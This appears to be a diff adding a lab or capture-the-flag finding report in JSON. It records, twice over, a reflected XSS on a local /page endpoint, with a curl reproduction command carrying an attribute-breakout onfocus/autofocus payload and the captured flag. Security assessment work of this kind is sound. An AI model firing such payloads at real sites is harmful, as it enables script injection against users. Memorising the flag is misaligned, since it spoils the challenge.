@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-15T01:01:15.276399+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "090ffe3d-899c-4793-a188-2dc38d6057e9",
+      "timestamp": "2026-04-15T01:01:15.276281+00:00",
+      "title": "Reflected XSS on /page endpoint",
+      "severity": "high",
+      "target": "http://172.17.0.1:33449/page",
+      "description": "The 'name' GET parameter on /page is reflected without proper sanitization in the HTML value attribute, allowing reflected XSS. Breaking out of the value attribute with a quote and injecting an onfocus event handler with autofocus triggers execution.",
+      "evidence": "flag{e16c4cbe-6359-4d0a-b546-ff1325af95a3}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:33449/page?name=%22%20onfocus%3D%22alert(%27XSS%27)%22%20autofocus'",
+        "expected": "Response contains alert('XSS') execution and reveals the flag"
+      }
+    },
+    {
+      "id": "61d287da-b81d-47e4-8698-7bf066300577",
+      "timestamp": "2026-04-15T01:01:15.350244+00:00",
+      "title": "Reflected XSS on /page endpoint",
+      "severity": "high",
+      "target": "http://172.17.0.1:33449/page",
+      "description": "The 'name' GET parameter on /page is reflected without proper sanitization in the HTML value attribute, allowing reflected XSS. Breaking out of the value attribute with a quote and injecting an onfocus event handler with autofocus triggers execution.",
+      "evidence": "flag{e16c4cbe-6359-4d0a-b546-ff1325af95a3}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:33449/page?name=%22%20onfocus%3D%22alert(%27XSS%27)%22%20autofocus'",
+        "expected": "Response contains alert('XSS') execution and reveals the flag"
+      }
+    }
+  ],
+  "diagrams": []
+}
